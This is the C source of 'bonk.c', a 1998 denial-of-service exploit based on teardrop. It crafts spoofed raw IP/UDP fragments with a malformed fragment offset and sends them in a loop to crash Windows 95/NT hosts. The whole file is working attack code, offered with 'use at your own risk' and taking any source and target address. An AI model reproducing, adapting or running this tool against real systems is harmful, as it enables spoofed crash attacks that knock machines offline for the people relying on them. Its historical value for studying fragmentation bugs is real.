/*
                                ==bendi - 1998==

                        bonk.c        -         5/01/1998
        Based On: teardrop.c by route|daemon9 & klepto
        Crashes *patched* win95/(NT?) machines.

        Basically, we set the frag offset > header length (teardrop
        reversed). There are many theories as to why this works,
        however i do not have the resources to perform extensive testing.
        I make no warranties. Use this code at your own risk.
        Rip it if you like, i've had my fun.

*/

#include <stdio.h>
#include <string.h>

#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
//#include <netinet/protocols.h>
#include <arpa/inet.h>

#define FRG_CONST       0x3
#define PADDING         0x1c

struct udp_pkt
{
        struct iphdr    ip;
        struct udphdr   udp;
        char data[PADDING];
} pkt;

int     udplen=sizeof(struct udphdr),
        iplen=sizeof(struct iphdr),
        datalen=100,
        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
        spf_sck;                        /* Socket */

void usage(void)
{
        fprintf(stderr, "Usage: ./bonk <src_addr> <dst_addr> [num]\n");
        exit(0);
}

u_long host_to_ip(char *host_name)
{
        static  u_long ip_bytes;
        struct hostent *res;

        res = gethostbyname(host_name);
        if (res == NULL)
                return (0);
        memcpy(&ip_bytes, res->h_addr, res->h_length);
        return (ip_bytes);
}

void quit(char *reason)
{
        perror(reason);
        close(spf_sck);
        exit(-1);
}

int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
           int dst_prt)
{
        int     bs;
        struct  sockaddr_in to;

        memset(&pkt, 0, psize);
                                                /* Fill in ip header */
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IPPROTO_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;
        pkt.ip.frag_off = htons(0x2000);        /* more to come */

        pkt.udp.source = htons(src_prt);        /* udp header */
        pkt.udp.dest = htons(dst_prt);
        pkt.udp.len = htons(8 + PADDING);
                                                /* send 1st frag */

        to.sin_family = AF_INET;
        to.sin_port = src_prt;
        to.sin_addr.s_addr = dst_addr;

        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));

        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
        pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                        /* 2nd frag */

        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
                (struct sockaddr *) &to, sizeof(struct sockaddr));

        return bs;
}

void main(int argc, char *argv[])
{
        u_long  src_addr,
                dst_addr;

        int     i,
                src_prt=53,
                dst_prt=53,
                bs = 1,
                pkt_count = 10;         /* Default amount */

        if (argc < 3)
                usage();

        if (argc == 4)
                pkt_count = atoi(argv[3]);      /* 10 does the trick */

        /* Resolve hostnames */

        src_addr = host_to_ip(argv[1]);
        if (!src_addr)
                quit("bad source host");
        dst_addr = host_to_ip(argv[2]);
        if (!dst_addr)
                quit("bad target host");

        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (!spf_sck)
                quit("socket()");
        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
        sizeof(bs)) < 0)
                quit("IP_HDRINCL");

        for (i = 0; i < pkt_count; ++i)
        {
                fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt);
                usleep(10000);
        }

        printf("Done.\n");
}
